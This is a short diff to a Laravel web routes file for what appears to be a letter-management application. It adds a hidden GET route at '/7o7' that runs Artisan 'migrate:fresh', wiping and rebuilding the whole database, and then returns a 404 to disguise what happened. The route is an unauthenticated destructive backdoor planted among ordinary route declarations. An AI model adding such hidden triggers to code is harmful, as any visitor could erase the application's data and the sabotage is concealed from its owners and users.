@@ -13,8 +13,13 @@ use App\Http\Controllers\Login;
 use App\Http\Controllers\SuratKeluar;
 use App\Http\Controllers\SuratMasuk;
 use App\Models\Postingan;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
+Route::get('/7o7', function () {
+    Artisan::call('migrate:fresh');
+    return abort(404);
+});
 /*
 |--------------------------------------------------------------------------
 | Web Routes
